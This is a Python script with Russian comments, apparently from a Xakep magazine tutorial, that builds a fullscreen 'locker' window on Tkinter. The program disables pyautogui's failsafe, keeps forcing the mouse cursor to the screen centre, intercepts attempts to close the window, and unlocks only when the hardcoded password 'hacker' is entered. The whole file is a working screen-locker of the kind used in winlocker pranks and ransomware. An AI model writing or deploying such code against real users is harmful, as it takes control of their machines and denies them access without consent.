import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

def callback(event):
    global k, entry
    if entry.get() == "hacker":
        k = True
        
def on_closing():
	# Кликаем в центр экрана
    click(width/2, height/2)
    # Перемещаем курсор мыши в центр экрана
    moveTo(width/2, height/2)
    # Включаем полноэкранный режим
    root.attributes("-fullscreen", True)
    # При попытке закрыть окно с помощью диспетчера задач вызываем on_closing
    root.protocol("WM_DELETE_WINDOW", on_closing)
    # Включаем постоянное обновление окна
    root.update()
    # Добавляем сочетание клавиш, которые будут закрывать программу
    root.bind('<Control-KeyPress-c>', callback)


# Создаем окно
root = Tk()

# Задаем заголовок окна
root.title('From "Xakep" with love')

# Открываем окно на весь экран
root.attributes("-fullscreen", True)

# Получаем ширину и высоту окна
width = root.winfo_screenwidth()
height = root.winfo_screenheight()

# Создаем текстовые подписи и задаем их расположение
label0 = Label(root, text="╚(•⌂•)╝ Locker by Xakep (╯°□°）╯︵ ┻━┻", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial 20')
label1.place(x=width/2-75-130, y=height/2-25-100)

# Создаем поле для ввода, задаем его размеры и расположение
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)

# Кликаем в центр окна
click(width/2, height/2)

# Вырубаем защиту левого верхнего угла экрана
pyautogui.FAILSAFE = False

# Включаем постоянное обновление окна и делаем паузу
root.update()
sleep(0.2)

# Обнуляем ключ
k = False
# Теперь непрерывно проверяем, не введен ли верный ключ
# Если введен, вызываем функцию хулиганства
while not k:
    on_closing()
